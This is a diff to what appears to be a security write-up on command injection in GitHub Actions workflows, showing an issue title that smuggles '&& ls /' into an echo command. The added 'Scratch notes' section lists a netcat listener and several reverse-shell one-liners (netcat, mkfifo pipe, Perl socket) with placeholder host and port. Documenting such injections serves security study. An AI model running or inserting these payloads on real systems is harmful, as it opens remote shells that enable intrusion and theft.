@@ -72,6 +72,18 @@ Sanitise the input using environment variables
 
 After macro expansion, **issue title** will be converted to `echo "new issue title" && ls / && echo ""`
 
+## Scratch notes
+
+Netcat listener command: `nc -l <PORT>`
+
+Netcat reverse shell command: `nc -e /bin/sh <HOST> <PORT>`
+
+If Netcat is new and doesn't support `-e` then try following alternatives
+
+`mkfifo /tmp/p; nc <HOST> <PORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p`
+
+`perl -e 'use Socket;$i="<HOST>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
 ## References
 
 - [GitHub Actions Security Vulnerability Blog](https://cycode.com/blog/github-actions-vulnerabilities/)
